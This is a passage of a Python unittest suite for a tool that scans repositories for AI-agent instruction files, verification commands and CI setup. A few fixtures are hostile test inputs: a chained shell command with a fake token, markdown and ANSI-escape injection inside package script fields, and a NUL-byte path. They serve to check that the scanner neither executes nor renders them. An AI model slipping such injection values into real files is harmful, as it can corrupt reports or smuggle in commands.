from __future__ import annotations

import json
import os
import shlex
import shutil
import subprocess
import sys
import tempfile
import unittest
from pathlib import Path


REPOSITORY_ROOT = Path(__file__).resolve().parents[1]
SCANNER = REPOSITORY_ROOT / "scripts" / "scan_repo.py"
NODE_SCANNER = REPOSITORY_ROOT / "scripts" / "scan_repo.cjs"
NODE_EXECUTABLE = shutil.which("node")
GIT_EXECUTABLE = shutil.which("git")


def write(root: Path, relative: str, content: str = "") -> Path:
    path = root / relative
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(content, encoding="utf-8")
    return path


def scan(
    root: Path, *extra: str, environment: dict[str, str] | None = None
) -> dict:
    result = subprocess.run(
        [sys.executable, str(SCANNER), "--root", str(root), "--format", "json", *extra],
        cwd=REPOSITORY_ROOT,
        capture_output=True,
        text=True,
        encoding="utf-8",
        errors="replace",
        env=environment,
        check=False,
        timeout=10,
    )
    if result.returncode != 0:
        raise AssertionError(f"scanner failed\nstdout:\n{result.stdout}\nstderr:\n{result.stderr}")
    return json.loads(result.stdout)


def scan_with_node(
    root: Path, *extra: str, environment: dict[str, str] | None = None
) -> dict:
    if NODE_EXECUTABLE is None:
        raise AssertionError("Node.js is unavailable")
    result = subprocess.run(
        [
            NODE_EXECUTABLE,
            str(NODE_SCANNER),
            "--root",
            str(root),
            "--format",
            "json",
            *extra,
        ],
        cwd=REPOSITORY_ROOT,
        capture_output=True,
        text=True,
        encoding="utf-8",
        errors="replace",
        env=environment,
        check=False,
        timeout=10,
    )
    if result.returncode != 0:
        raise AssertionError(
            f"Node scanner failed\nstdout:\n{result.stdout}\nstderr:\n{result.stderr}"
        )
    return json.loads(result.stdout)


def markdown_with(command: list[str], root: Path) -> str:
    result = subprocess.run(
        [*command, "--root", str(root), "--format", "markdown"],
        cwd=REPOSITORY_ROOT,
        capture_output=True,
        text=True,
        encoding="utf-8",
        errors="replace",
        check=False,
        timeout=10,
    )
    if result.returncode != 0:
        raise AssertionError(
            f"scanner failed\nstdout:\n{result.stdout}\nstderr:\n{result.stderr}"
        )
    return result.stdout


def normalized_runtime_report(report: dict) -> dict:
    normalized = json.loads(json.dumps(report))
    normalized["scan"].pop("implementation", None)
    return normalized


class ScanRepositoryTests(unittest.TestCase):
    def test_empty_repository_reports_missing_spine(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            report = scan(Path(temporary))

        self.assertIs(report["version_control"]["is_repository"], False)
        self.assertEqual(
            report["version_control"]["repository_state"], "not_repository"
        )
        self.assertEqual(
            report["version_control"]["worktree_state"], "not_applicable"
        )
        self.assertEqual(report["scan"]["files_seen"], 0)
        self.assertIn("empty_repository", report["diagnostic_hints"])
        self.assertIn(
            "no_agent_instruction_surface_detected", report["diagnostic_hints"]
        )
        self.assertIn("no_declared_verification_command_detected", report["diagnostic_hints"])

    def test_partial_node_repository_keeps_provider_surface_and_commands_visible(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            write(
                root,
                "package.json",
                json.dumps(
                    {
                        "name": "partial-project",
                        "scripts": {
                            "test:unit": "vitest run",
                            "typecheck": "tsc --noEmit",
                            "start": "node src/index.js",
                        },
                    }
                ),
            )
            write(root, "package-lock.json", "{}")
            write(root, "CLAUDE.md", "# Project rules\n\nRun the focused tests.\n")
            write(root, "docs/architecture.md", "# Architecture\n")
            write(root, "src/index.ts", "export const value = 1;\n")
            write(root, "tests/index.test.ts", "// representative test\n")

            report = scan(root)

        self.assertEqual(report["project"]["ecosystems"], ["Node.js"])
        self.assertEqual(report["agent_surface"]["instructions"][0]["kind"], "claude")
        self.assertIn("provider_specific_root_instructions_only", report["diagnostic_hints"])
        command_names = {
            command["name"] for command in report["verification"]["declared_commands"]
        }
        self.assertEqual(command_names, {"test:unit", "typecheck"})
        self.assertNotIn(
            "no_declared_verification_command_detected", report["diagnostic_hints"]
        )

    def test_nested_instructions_do_not_masquerade_as_a_root_entrypoint(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            write(root, "packages/api/AGENTS.md", "# API rules\n")

            reports = [scan(root)]
            if NODE_EXECUTABLE is not None:
                reports.append(scan_with_node(root))

        for report in reports:
            with self.subTest(implementation=report["scan"]["implementation"]):
                self.assertIn(
                    "no_root_instruction_entrypoint_detected",
                    report["diagnostic_hints"],
                )
                self.assertNotIn(
                    "provider_specific_root_instructions_only",
                    report["diagnostic_hints"],
                )

        if len(reports) == 2:
            self.assertEqual(
                normalized_runtime_report(reports[0]),
                normalized_runtime_report(reports[1]),
            )

    def test_documented_verification_commands_are_detected_but_never_run(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            marker = root / "scanner-executed"
            write(
                root,
                "AGENTS.md",
                "# Rules\n\n"
                "```text\n"
                "API_TOKEN=document-secret python -m unittest && "
                "touch scanner-executed\n"
                "python scripts/scan_repo.py --format markdown\n"
                "```\n",
            )

            report = scan(root)
            marker_exists = marker.exists()

        self.assertFalse(marker_exists)
        self.assertNotIn("document-secret", json.dumps(report))
        self.assertEqual(
            report["agent_surface"]["instructions"][0][
                "documented_verification_commands"
            ],
            [
                {
                    "line": 4,
                    "definition": (
                        "API_TOKEN=<redacted> python -m unittest && "
                        "touch scanner-executed"
                    ),
                }
            ],
        )
        self.assertEqual(
            report["verification"]["declared_commands"],
            [
                {
                    "source": "AGENTS.md",
                    "name": "documented:L4",
                    "definition": (
                        "API_TOKEN=<redacted> python -m unittest && "
                        "touch scanner-executed"
                    ),
                }
            ],
        )
        self.assertNotIn(
            "no_declared_verification_command_detected", report["diagnostic_hints"]
        )

    def test_multiline_documented_commands_are_joined_and_redacted(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            write(
                root,
                "AGENTS.md",
                "# Rules\n\n"
                "```text\n"
                "API_TOKEN=document-secret python -m unittest discover \\\n"
                "  -s tests \\\n"
                "  -v\n"
                "```\n",
            )

            reports = [scan(root)]
            if NODE_EXECUTABLE is not None:
                reports.append(scan_with_node(root))

        expected = [
            {
                "line": 4,
                "definition": (
                    "API_TOKEN=<redacted> python -m unittest discover -s tests -v"
                ),
            }
        ]
        for report in reports:
            with self.subTest(implementation=report["scan"]["implementation"]):
                commands = report["agent_surface"]["instructions"][0][
                    "documented_verification_commands"
                ]
                self.assertEqual(commands, expected)
                self.assertNotIn("document-secret", json.dumps(report))

    def test_multiple_instruction_surfaces_and_broken_links_are_evidence(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            write(root, "AGENTS.md", "# Shared rules\n\nSee [missing](docs/missing.md).\n")
            write(root, "GEMINI.md", "# Gemini rules\n")
            write(
                root,
                ".agents/skills/example/SKILL.md",
                "---\nname: example\ndescription: Example fixture.\n---\n",
            )
            write(root, "Makefile", "test:\n\t@echo ok\n")
            write(root, ".github/workflows/ci.yml", "name: CI\n")

            report = scan(root)

        self.assertIn(
            "multiple_root_instruction_surfaces_require_reconciliation",
            report["diagnostic_hints"],
        )
        self.assertIn(
            "broken_relative_links_in_agent_instructions", report["diagnostic_hints"]
        )
        self.assertEqual(report["agent_surface"]["skills"], [".agents/skills/example/SKILL.md"])
        self.assertEqual(report["automation"]["ci_files"], [".github/workflows/ci.yml"])
        self.assertEqual(
            report["agent_surface"]["instructions"][0]["broken_relative_links"],
            ["docs/missing.md"],
        )

    def test_ci_inventory_ignores_docs_in_configuration_directories(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            base = Path(temporary)
            docs_only = base / "docs-only"
            docs_only.mkdir()
            write(docs_only, ".github/workflows/README.md", "# Workflows\n")
            write(docs_only, ".circleci/README.md", "# CircleCI\n")
            write(docs_only, ".buildkite/README.md", "# Buildkite\n")
            configured = base / "configured"
            configured.mkdir()
            write(configured, ".github/workflows/ci.yaml", "name: CI\n")

            commands = [scan]
            if NODE_EXECUTABLE is not None:
                commands.append(scan_with_node)
            docs_reports = [command(docs_only) for command in commands]
            configured_reports = [command(configured) for command in commands]

        for report in docs_reports:
            with self.subTest(
                fixture="docs-only", implementation=report["scan"]["implementation"]
            ):
                self.assertEqual(report["automation"]["ci_files"], [])
                self.assertIn(
                    "no_ci_configuration_detected", report["diagnostic_hints"]
                )
        for report in configured_reports:
            with self.subTest(
                fixture="configured", implementation=report["scan"]["implementation"]
            ):
                self.assertEqual(
                    report["automation"]["ci_files"],
                    [".github/workflows/ci.yaml"],
                )
                self.assertNotIn(
                    "no_ci_configuration_detected", report["diagnostic_hints"]
                )

    def test_current_agent_surfaces_and_imports_are_visible(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            write(root, "AGENTS.md", "# Shared rules\n\n@docs/existing.md\n")
            write(root, ".kimi/AGENTS.md", "# Kimi project rules\n")
            write(root, "services/api/agents.md", "# Kimi API rules\n")
            write(
                root,
                "CLAUDE.md",
                "# Claude rules\n\n"
                "@docs/existing.md\n"
                "@docs/missing.md\n"
                "@../outside.md\n"
                "`@docs/inline-example.md`\n\n"
                "```text\n"
                "@docs/fenced-example.md\n"
                "```\n",
            )
            write(root, "GEMINI.md", "# Gemini rules\n\n@docs/existing.md\n")
            write(root, "REVIEW.md", "# Claude review guidance\n")
            write(root, "docs/existing.md", "# Existing\n")
            write(root, ".claude/rules/backend.md", "# Backend rule\n")
            write(root, ".cursor/rules/frontend.mdc", "# Frontend rule\n")
            write(root, "backend/.cursor/rules/api.mdc", "# API rule\n")
            write(root, ".windsurf/rules/workspace.md", "# Workspace rule\n")
            write(root, "backend/.windsurf/rules/api.md", "# Scoped rule\n")
            write(root, ".cursor/BUGBOT.md", "# Root Bugbot guidance\n")
            write(root, "backend/.cursor/BUGBOT.md", "# API Bugbot guidance\n")
            write(
                root,
                ".github/copilot-instructions.md",
                "# Copilot rules\n\n@../docs/existing.md\n",
            )
            write(root, ".github/instructions/ui.instructions.md", "# UI rule\n")
            write(root, ".claude/agents/reviewer.md", "# Reviewer\n")
            write(root, ".gemini/agents/tester.md", "# Tester\n")
            write(root, ".github/agents/security.md", "# Security\n")
            write(root, ".claude/commands/check.md", "# Check command\n")
            write(root, ".gemini/commands/check.toml", 'prompt = "check"\n')
            write(root, ".github/prompts/check.prompt.md", "# Check prompt\n")
            write(root, ".cursor/commands/check.md", "# Check command\n")
            write(root, ".windsurf/workflows/check.md", "# Check workflow\n")
            write(root, ".windsurf/settings.json", "{}\n")

            reports = [scan(root)]
            if NODE_EXECUTABLE is not None:
                reports.append(scan_with_node(root))

        expected_instruction_kinds = {
            "AGENTS.md": "shared",
            ".kimi/AGENTS.md": "kimi",
            "services/api/agents.md": "kimi",
            "CLAUDE.md": "claude",
            "GEMINI.md": "gemini",
            "REVIEW.md": "claude-review",
            ".claude/rules/backend.md": "claude-rule",
            ".cursor/BUGBOT.md": "cursor-review",
            ".cursor/rules/frontend.mdc": "cursor",
            ".github/copilot-instructions.md": "copilot",
            ".github/instructions/ui.instructions.md": "copilot-path",
            ".windsurf/rules/workspace.md": "windsurf-rule",
            "backend/.cursor/BUGBOT.md": "cursor-review",
            "backend/.cursor/rules/api.mdc": "cursor",
            "backend/.windsurf/rules/api.md": "windsurf-rule",
        }
        expected_agent_definitions = [
            {"path": ".claude/agents/reviewer.md", "kind": "claude"},
            {"path": ".gemini/agents/tester.md", "kind": "gemini"},
            {"path": ".github/agents/security.md", "kind": "copilot"},
        ]
        expected_prompts = [
            {"path": ".claude/commands/check.md", "kind": "claude"},
            {"path": ".cursor/commands/check.md", "kind": "cursor"},
            {"path": ".gemini/commands/check.toml", "kind": "gemini"},
            {"path": ".github/prompts/check.prompt.md", "kind": "copilot"},
            {"path": ".windsurf/workflows/check.md", "kind": "windsurf"},
        ]
        for report in reports:
            with self.subTest(implementation=report["scan"]["implementation"]):
                self.assertEqual(
                    {
                        item["path"]: item["kind"]
                        for item in report["agent_surface"]["instructions"]
                    },
                    expected_instruction_kinds,
                )
                self.assertEqual(
                    report["agent_surface"]["agent_definitions"],
                    expected_agent_definitions,
                )
                self.assertEqual(report["agent_surface"]["prompts"], expected_prompts)
                self.assertIn(
                    ".windsurf/settings.json", report["agent_surface"]["config"]
                )
                self.assertNotIn(
                    ".gemini/commands/check.toml",
                    report["agent_surface"]["config"],
                )
                shared = next(
                    item
                    for item in report["agent_surface"]["instructions"]
                    if item["path"] == "AGENTS.md"
                )
                copilot = next(
                    item
                    for item in report["agent_surface"]["instructions"]
                    if item["path"] == ".github/copilot-instructions.md"
                )
                self.assertEqual(shared["imports"], ["docs/existing.md"])
                self.assertEqual(copilot["imports"], ["../docs/existing.md"])
                claude = next(
                    item
                    for item in report["agent_surface"]["instructions"]
                    if item["path"] == "CLAUDE.md"
                )
                self.assertEqual(
                    claude["imports"],
                    ["../outside.md", "docs/existing.md", "docs/missing.md"],
                )
                self.assertEqual(claude["broken_imports"], ["docs/missing.md"])
                self.assertEqual(claude["imports_outside_repository"], ["../outside.md"])
                self.assertNotIn("docs/inline-example.md", claude["imports"])
                self.assertNotIn("docs/fenced-example.md", claude["imports"])
                self.assertIn(
                    "broken_imports_in_agent_instructions",
                    report["diagnostic_hints"],
                )
                self.assertIn(
                    "instruction_imports_outside_repository",
                    report["diagnostic_hints"],
                )

        if len(reports) == 2:
            self.assertEqual(
                normalized_runtime_report(reports[0]),
                normalized_runtime_report(reports[1]),
            )

    def test_kimi_project_instruction_is_a_root_entrypoint(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            write(root, ".kimi/AGENTS.md", "# Kimi project rules\n")

            reports = [scan(root)]
            if NODE_EXECUTABLE is not None:
                reports.append(scan_with_node(root))

        for report in reports:
            with self.subTest(implementation=report["scan"]["implementation"]):
                self.assertEqual(
                    [
                        (item["path"], item["kind"])
                        for item in report["agent_surface"]["instructions"]
                    ],
                    [(".kimi/AGENTS.md", "kimi")],
                )
                self.assertNotIn(
                    "no_root_instruction_entrypoint_detected",
                    report["diagnostic_hints"],
                )
                self.assertIn(
                    "provider_specific_root_instructions_only",
                    report["diagnostic_hints"],
                )

        if len(reports) == 2:
            self.assertEqual(
                normalized_runtime_report(reports[0]),
                normalized_runtime_report(reports[1]),
            )

    def test_markdown_output_encodes_untrusted_control_and_fence_characters(
        self,
    ) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            write(root, "docs/architecture`guide.md", "# Architecture\n")
            write(
                root,
                "package.json",
                json.dumps(
                    {
                        "scripts": {
                            "test:unsafe`\n## injected": (
                                "node --test\n## injected\x1b[31m"
                            )
                        }
                    }
                ),
            )

            markdown_reports = [
                markdown_with([sys.executable, str(SCANNER)], root)
            ]
            if NODE_EXECUTABLE is not None:
                markdown_reports.append(
                    markdown_with([NODE_EXECUTABLE, str(NODE_SCANNER)], root)
                )

        for markdown in markdown_reports:
            self.assertNotIn("\x1b", markdown)
            self.assertNotIn("\n## injected", markdown)
            self.assertIn("\\u000a", markdown)
            self.assertIn("\\u001b", markdown)
            self.assertIn("\\u0060", markdown)

        if len(markdown_reports) == 2:
            self.assertEqual(markdown_reports[0], markdown_reports[1])

    def test_markdown_examples_comments_and_mentions_are_not_import_or_link_evidence(
        self,
    ) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            write(root, "docs/existing.md", "# Existing\n")
            write(
                root,
                "AGENTS.md",
                "# Rules\n\n"
                "Contact @alice and mention @scope/pkg in prose.\n"
                "Use `@docs/inline.md` as an inline example.\n\n"
                "```markdown title=\"example\"\n"
                "[fenced example](docs/fenced-missing.md)\n"
                "@docs/fenced-missing.md\n"
                "```\n\n"
                "<!-- [commented](docs/comment-missing.md) "
                "@docs/comment-missing.md -->\n"
                "See [existing](docs/existing.md).\n"
                "@docs/existing.md\n"
                "@docs/actual-missing.md\n",
            )

            reports = [scan(root)]
            if NODE_EXECUTABLE is not None:
                reports.append(scan_with_node(root))

        for report in reports:
            with self.subTest(implementation=report["scan"]["implementation"]):
                instruction = report["agent_surface"]["instructions"][0]
                self.assertEqual(
                    instruction["imports"],
                    ["docs/actual-missing.md", "docs/existing.md"],
                )
                self.assertEqual(
                    instruction["broken_imports"], ["docs/actual-missing.md"]
                )
                self.assertEqual(instruction["broken_relative_links"], [])
                self.assertNotIn("alice", instruction["imports"])
                self.assertNotIn("scope/pkg", instruction["imports"])

        if len(reports) == 2:
            self.assertEqual(
                normalized_runtime_report(reports[0]),
                normalized_runtime_report(reports[1]),
            )

    def test_malformed_instruction_paths_do_not_abort_scanning(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            malformed = "docs/\x00bad.md"
            write(
                root,
                "AGENTS.md",
                f"# Rules\n\n@{malformed}\n[bad]({malformed})\n",
            )

            reports = [scan(root)]
            if NODE_EXECUTABLE is not None:
                reports.append(scan_with_node(root))

        for report in reports:
            with self.subTest(implementation=report["scan"]["implementation"]):
                instruction = report["agent_surface"]["instructions"][0]
                self.assertEqual(instruction["broken_relative_links"], [malformed])
                self.assertEqual(instruction["broken_imports"], [malformed])

        if len(reports) == 2:
            self.assertEqual(
                normalized_runtime_report(reports[0]),
                normalized_runtime_report(reports[1]),
            )

    def test_file_limit_is_explicit(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            for index in range(5):
                write(root, f"src/file-{index}.py", "pass\n")

            report = scan(root, "--max-files", "3")

        self.assertTrue(report["scan"]["truncated"])
        self.assertEqual(report["scan"]["files_seen"], 3)
        self.assertIn("scan_truncated_at_file_limit", report["diagnostic_hints"])

    def test_traversal_limit_reports_incomplete_detection_not_false_absence(
        self,
    ) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            write(root, "a.txt", "first\n")
            write(root, ".github/workflows/ci.yml", "name: CI\n")
            write(root, "nested/AGENTS.md", "# Rules\n")

            commands = [scan]
            if NODE_EXECUTABLE is not None:
                commands.append(scan_with_node)
            reports = [command(root, "--max-files", "1") for command in commands]
            markdown_reports = [
                markdown_with(
                    [
                        sys.executable if command is scan else NODE_EXECUTABLE,
                        str(SCANNER if command is scan else NODE_SCANNER),
                        "--max-files",
                        "1",
                    ],
                    root,
                )
                for command in commands
            ]

        for report in reports:
            with self.subTest(implementation=report["scan"]["implementation"]):
                self.assertTrue(report["scan"]["truncated"])
                self.assertIn(
                    "agent_instruction_surface_detection_incomplete",
                    report["diagnostic_hints"],
                )
                self.assertIn(
                    "declared_verification_command_detection_incomplete",
                    report["diagnostic_hints"],
                )
                self.assertIn(
                    "ci_configuration_detection_incomplete",
                    report["diagnostic_hints"],
                )
                self.assertNotIn(
                    "no_agent_instruction_surface_detected",
                    report["diagnostic_hints"],
                )
                self.assertNotIn(
                    "no_declared_verification_command_detected",
                    report["diagnostic_hints"],
                )
                self.assertNotIn(
                    "no_ci_configuration_detected", report["diagnostic_hints"]
                )

        for rendered in markdown_reports:
            self.assertIn("detection was incomplete", rendered)
            self.assertIn("unverified (traversal incomplete)", rendered)

    def test_exact_file_limit_is_not_reported_as_truncated(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            for index in range(3):
                write(root, f"src/file-{index}.py", "pass\n")

            reports = [scan(root, "--max-files", "3")]
            if NODE_EXECUTABLE is not None:
                reports.append(scan_with_node(root, "--max-files", "3"))

        for report in reports:
            with self.subTest(implementation=report["scan"]["implementation"]):
                self.assertEqual(report["scan"]["files_seen"], 3)
                self.assertFalse(report["scan"]["truncated"])
                self.assertNotIn(
                    "scan_truncated_at_file_limit", report["diagnostic_hints"]
                )

    def test_directory_and_depth_limits_are_explicit(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            write(root, "root.txt", "root\n")
            write(root, "a/inside.txt", "inside\n")
            write(root, "a/deep/value.txt", "deep\n")
            write(root, "b/value.txt", "other\n")

            commands = [scan]
            if NODE_EXECUTABLE is not None:
                commands.append(scan_with_node)
            directory_reports = [
                command(root, "--max-directories", "2") for command in commands
            ]
            depth_reports = [command(root, "--max-depth", "1") for command in commands]
            exact_reports = [
                command(root, "--max-directories", "4", "--max-depth", "2")
                for command in commands
            ]

        for report in directory_reports:
            with self.subTest(
                limit="directories", implementation=report["scan"]["implementation"]
            ):
                self.assertTrue(report["scan"]["truncated"])
                self.assertEqual(report["scan"]["directories_seen"], 2)
                self.assertEqual(report["scan"]["limit_reasons"], ["max_directories"])
                self.assertIn(
                    "scan_truncated_at_directory_limit", report["diagnostic_hints"]
                )

        for report in depth_reports:
            with self.subTest(
                limit="depth", implementation=report["scan"]["implementation"]
            ):
                self.assertTrue(report["scan"]["truncated"])
                self.assertEqual(report["scan"]["directories_seen"], 3)
                self.assertEqual(report["scan"]["limit_reasons"], ["max_depth"])
                self.assertIn("a/deep", report["scan"]["skipped_directories"])
                self.assertIn(
                    "scan_truncated_at_depth_limit", report["diagnostic_hints"]
                )

        for report in exact_reports:
            with self.subTest(
                limit="exact", implementation=report["scan"]["implementation"]
            ):
                self.assertFalse(report["scan"]["truncated"])
                self.assertEqual(report["scan"]["directories_seen"], 4)
                self.assertEqual(report["scan"]["limit_reasons"], [])

    @unittest.skipUnless(os.name != "nt", "FIFO fixture requires POSIX")
    def test_special_files_are_skipped_without_blocking(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            write(root, "README.md", "# Project\n")
            fifo = root / "AGENTS.md"
            os.mkfifo(fifo)

            reports = [scan(root)]
            if NODE_EXECUTABLE is not None:
                reports.append(scan_with_node(root))

        for report in reports:
            with self.subTest(implementation=report["scan"]["implementation"]):
                self.assertEqual(report["agent_surface"]["instructions"], [])
                self.assertIn("AGENTS.md", report["scan"]["skipped_special_files"])

    def test_high_signal_docs_include_root_localized_and_nested_paths(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            for index in range(100):
                write(root, f"src/file-{index}.py", "pass\n")
            expected = {
                "ARCHITECTURE.md",
                "DESIGN.md",
                "README.zh-CN.md",
                "RUNBOOK.md",
                "docs/architecture/overview.md",
                "docs/development/commands.md",
                "docs/operations/observability.md",
                "docs/product/business-rules.md",
                "docs/verification/runtime-verification.md",
            }
            for relative in expected:
                write(root, relative, f"# {relative}\n")

            reports = [scan(root)]
            if NODE_EXECUTABLE is not None:
                reports.append(scan_with_node(root))

        for report in reports:
            with self.subTest(implementation=report["scan"]["implementation"]):
                self.assertTrue(
                    expected.issubset(
                        set(report["documentation"]["high_signal_files"])
                    )
                )
                self.assertNotIn(
                    "no_high_signal_architecture_or_testing_doc_detected",
                    report["diagnostic_hints"],
                )

    def test_high_signal_diagnostic_uses_docs_beyond_the_report_cap(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            for index in range(100):
                write(root, f"src/file-{index}.py", "pass\n")
            for index in range(205):
                write(root, f"README.locale-{index:03d}.md", "# Localized README\n")
            write(root, "docs/z/architecture/overview.md", "# Architecture\n")

            reports = [scan(root)]
            if NODE_EXECUTABLE is not None:
                reports.append(scan_with_node(root))

        for report in reports:
            with self.subTest(implementation=report["scan"]["implementation"]):
                self.assertEqual(
                    len(report["documentation"]["high_signal_files"]),
                    200,
                )
                self.assertNotIn(
                    "docs/z/architecture/overview.md",
                    report["documentation"]["high_signal_files"],
                )
                self.assertNotIn(
                    "no_high_signal_architecture_or_testing_doc_detected",
                    report["diagnostic_hints"],
                )

    def test_report_caps_are_explicit_and_do_not_corrupt_derived_ecosystems(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            for index in range(200):
                write(root, f"crates/crate-{index:03d}/Cargo.toml", "[package]\n")
            write(
                root,
                "z/package.json",
                '{"scripts":{"test":"node --test"}}\n',
            )

            reports = [scan(root)]
            if NODE_EXECUTABLE is not None:
                reports.append(scan_with_node(root))

        for report in reports:
            with self.subTest(implementation=report["scan"]["implementation"]):
                self.assertFalse(report["scan"]["truncated"])
                self.assertTrue(report["scan"]["report_truncated"])
                self.assertEqual(len(report["project"]["manifests"]), 200)
                self.assertNotIn("z/package.json", report["project"]["manifests"])
                self.assertEqual(report["project"]["ecosystems"], ["Node.js", "Rust"])
                sections = {
                    item["path"]: item
                    for item in report["scan"]["report_truncated_sections"]
                }
                self.assertEqual(
                    sections["project.manifests"],
                    {"path": "project.manifests", "total": 201, "reported": 200},
                )
                self.assertIn("report_fields_truncated", report["diagnostic_hints"])
                self.assertEqual(
                    report["verification"]["declared_commands"][0]["name"],
                    "test",
                )

        if len(reports) == 2:
            self.assertEqual(
                normalized_runtime_report(reports[0]),
                normalized_runtime_report(reports[1]),
            )

    def test_inner_command_caps_are_explicit_without_hiding_verification(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            scripts = {f"command-{index:03d}": "node tool.js" for index in range(100)}
            scripts["zzz-test"] = "node --test"
            write(root, "package.json", json.dumps({"scripts": scripts}))

            reports = [scan(root)]
            if NODE_EXECUTABLE is not None:
                reports.append(scan_with_node(root))

        for report in reports:
            with self.subTest(implementation=report["scan"]["implementation"]):
                package = report["verification"]["package_scripts"][0]
                self.assertEqual(package["scripts_total"], 101)
                self.assertEqual(len(package["scripts"]), 100)
                self.assertNotIn("zzz-test", package["scripts"])
                self.assertIn(
                    "zzz-test",
                    {
                        command["name"]
                        for command in report["verification"]["declared_commands"]
                    },
                )
                sections = {
                    item["path"]: item
                    for item in report["scan"]["report_truncated_sections"]
                }
                self.assertEqual(
                    sections["verification.package_scripts[package.json].scripts"],
                    {
                        "path": "verification.package_scripts[package.json].scripts",
                        "total": 101,
                        "reported": 100,
                    },
                )

        if len(reports) == 2:
            self.assertEqual(
                normalized_runtime_report(reports[0]),
                normalized_runtime_report(reports[1]),
            )

    def test_vendored_directories_are_opt_in(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            write(root, "src/main.py", "pass\n")
            write(root, "vendor/library.py", "pass\n")

            default_report = scan(root)
            included_report = scan(root, "--include-vendored")

        self.assertEqual(default_report["scan"]["files_seen"], 1)
        self.assertEqual(included_report["scan"]["files_seen"], 2)
        self.assertIn("vendor", default_report["scan"]["skipped_directories"])

    def test_exact_exclusion_removes_only_the_named_bootstrap_tool(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            excluded = root / "agentize-skill"
            write(root, "AGENTS.md", "# Target guidance\n")
            write(
                root,
                "package.json",
                json.dumps(
                    {
                        "name": "target-project",
                        "scripts": {"test:unit": "node --test"},
                    }
                ),
            )
            write(root, "src/index.js", "export const value = 1;\n")
            write(root, "tests/index.test.js", "// target test\n")
            write(
                root,
                ".agents/skills/project-skill/SKILL.md",
                "---\nname: project-skill\n---\n",
            )
            write(excluded, "AGENTS.md", "# Agentize development guidance\n")
            write(excluded, "pyproject.toml", "[project]\nname = 'agentize-skill'\n")
            write(excluded, "tests/test_scanners.py", "def test_scanner(): pass\n")

            reports = [
                scan(
                    root,
                    "--exclude-path",
                    "agentize-skill",
                )
            ]
            if NODE_EXECUTABLE is not None:
                reports.append(
                    scan_with_node(root, "--exclude-path", str(excluded))
                )

        for report in reports:
            with self.subTest(implementation=report["scan"]["implementation"]):
                self.assertEqual(report["schema_version"], 7)
                self.assertEqual(
                    report["scan"]["excluded_paths"],
                    ["agentize-skill"],
                )
                self.assertNotIn(
                    "agentize-skill", report["project"]["top_level_entries"]
                )
                self.assertEqual(report["project"]["ecosystems"], ["Node.js"])
                self.assertNotIn(
                    "Python",
                    {
                        language["name"]
                        for language in report["project"]["languages"]
                    },
                )
                self.assertEqual(
                    [
                        instruction["path"]
                        for instruction in report["agent_surface"]["instructions"]
                    ],
                    ["AGENTS.md"],
                )
                self.assertEqual(
                    report["agent_surface"]["skills"],
                    [".agents/skills/project-skill/SKILL.md"],
                )
                self.assertEqual(
                    report["verification"]["test_paths"],
                    ["tests/index.test.js"],
                )

        if len(reports) == 2:
            self.assertEqual(
                normalized_runtime_report(reports[0]),
                normalized_runtime_report(reports[1]),
            )

    def test_nested_scanner_automatically_excludes_its_own_skill_package(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            installed = root / ".agents/skills/agentize-skill"
            write(root, "AGENTS.md", "# Target guidance\n")
            write(root, "package.json", '{"scripts":{"test":"node --test"}}\n')
            write(root, "tests/target.test.js", "// target test\n")
            write(installed, "SKILL.md", "---\nname: agentize-skill\n---\n")
            write(installed, "tests/internal_test.py", "def test_internal(): pass\n")
            python_scanner = installed / "scripts/scan_repo.py"
            python_scanner.parent.mkdir(parents=True, exist_ok=True)
            shutil.copy2(SCANNER, python_scanner)

            commands = [[sys.executable, str(python_scanner)]]
            if NODE_EXECUTABLE is not None:
                node_scanner = installed / "scripts/scan_repo.cjs"
                shutil.copy2(NODE_SCANNER, node_scanner)
                commands.append([NODE_EXECUTABLE, str(node_scanner)])
            reports = []
            for command in commands:
                result = subprocess.run(
                    [*command, "--root", str(root), "--format", "json"],
                    cwd=root,
                    capture_output=True,
                    text=True,
                    encoding="utf-8",
                    errors="replace",
                    check=False,
                    timeout=10,
                )
                self.assertEqual(result.returncode, 0, result.stderr)
                reports.append(json.loads(result.stdout))

        for report in reports:
            with self.subTest(implementation=report["scan"]["implementation"]):
                self.assertEqual(
                    report["scan"]["excluded_paths"],
                    [".agents/skills/agentize-skill"],
                )
                self.assertEqual(
                    [
                        item["path"]
                        for item in report["agent_surface"]["instructions"]
                    ],
                    ["AGENTS.md"],
                )
                self.assertEqual(report["agent_surface"]["skills"], [])
                self.assertEqual(
                    report["verification"]["test_paths"],
                    ["tests/target.test.js"],
                )
                self.assertNotIn(
                    "Python",
                    {
                        language["name"]
                        for language in report["project"]["languages"]
                    },
                )

        if len(reports) == 2:
            self.assertEqual(
                normalized_runtime_report(reports[0]),
